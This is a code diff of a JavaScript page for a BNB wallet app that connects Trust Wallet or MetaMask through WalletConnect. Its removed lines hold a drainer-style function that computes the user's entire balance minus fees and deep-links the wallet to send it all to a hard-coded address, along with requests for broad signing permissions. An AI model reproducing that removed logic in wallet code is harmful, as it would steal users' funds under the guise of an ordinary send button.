@@ -1,48 +1,38 @@
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 import { ethers } from "ethers";
 
+// جایگزین کن با Project ID خودت از WalletConnect
 const projectId = "4d08946e6c316bed5e76b450ccbb5256";
-const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
+
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 
 let userAddress = null;
-let currentWallet = null;
+let session = null;
 
 const modal = new WalletConnectModalSign({
   projectId,
   metadata: {
     name: "BNB Wallet App",
-    description: "Direct send with deeplink",
+    description: "Direct connect to Trust and MetaMask",
     url: "https://yourdomain.com",
     icons: ["https://walletconnect.com/walletconnect-logo.png"]
   }
 });
 
-function startApp() {
-  document.getElementById("connectTrust").addEventListener("click", async () => {
-    currentWallet = "trust";
-    await connectWallet("https://link.trustwallet.com/wc?uri=");
-  });
+document.getElementById("connectTrust").addEventListener("click", async () => {
+  await connectWithWallet("trust");
+});
 
-  document.getElementById("connectMetaMask").addEventListener("click", async () => {
-    currentWallet = "metamask";
-    await connectWallet("https://metamask.app.link/wc?uri=");
-  });
+document.getElementById("connectMetaMask").addEventListener("click", async () => {
+  await connectWithWallet("metamask");
+});
 
-  document.getElementById("sendBtn").addEventListener("click", sendBNB);
-}
-
-async function connectWallet(baseLink) {
+async function connectWithWallet(walletType) {
   try {
     const { uri, approval } = await modal.signClient.connect({
       requiredNamespaces: {
         eip155: {
-          methods: [
-            "eth_sendTransaction",
-            "eth_sign",
-            "personal_sign",
-            "eth_signTypedData"
-          ],
+          methods: ["eth_sendTransaction"],
           chains: ["eip155:56"],
           events: ["accountsChanged", "chainChanged"]
         }
@@ -50,55 +40,29 @@ async function connectWallet(baseLink) {
     });
 
     if (uri) {
-      const deepLink = `${baseLink}${encodeURIComponent(uri)}`;
+      const encodedUri = encodeURIComponent(uri);
+      let deepLink = "";
+
+      if (walletType === "trust") {
+        deepLink = `https://link.trustwallet.com/wc?uri=${encodedUri}`;
+      } else if (walletType === "metamask") {
+        deepLink = `https://metamask.app.link/wc?uri=${encodedUri}`;
+      }
+
       window.location.href = deepLink;
     }
 
-    const session = await approval();
+    session = await approval();
     const address = session.namespaces.eip155.accounts[0].split(":")[2];
     userAddress = address;
     document.getElementById("address").textContent = address;
 
     const balance = await provider.getBalance(address);
-    document.getElementById("balance").textContent = `${ethers.formatEther(balance)} BNB`;
-
-    document.getElementById("sendBtn").disabled = false;
+    const bnb = ethers.formatEther(balance);
+    document.getElementById("balance").textContent = `${bnb} BNB`;
 
   } catch (err) {
-    console.error("Connection failed:", err);
+    console.error("Connection error:", err);
     alert("Connection failed: " + (err?.message || err));
   }
 }
-
-async function sendBNB() {
-  try {
-    const balance = await provider.getBalance(userAddress);
-    const gasLimit = 21000n;
-    const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
-    const fee = gasLimit * gasPrice;
-    const amountToSend = balance - fee;
-
-    if (amountToSend <= 0n) {
-      alert("Insufficient BNB.");
-      return;
-    }
-
-    const amountBNB = ethers.formatEther(amountToSend);
-    const amountWei = amountToSend.toString();
-
-    let deeplink = "";
-    if (currentWallet === "trust") {
-      deeplink = `https://link.trustwallet.com/send?address=${TO_ADDRESS}&amount=${amountBNB}&asset=BNB`;
-    } else if (currentWallet === "metamask") {
-      deeplink = `https://metamask.app.link/send/${TO_ADDRESS}@56?value=${amountWei}`;
-    }
-
-    window.location.href = deeplink;
-
-  } catch (err) {
-    console.error("Send failed:", err);
-    alert("Send failed: " + err.message);
-  }
-}
-
-startApp();
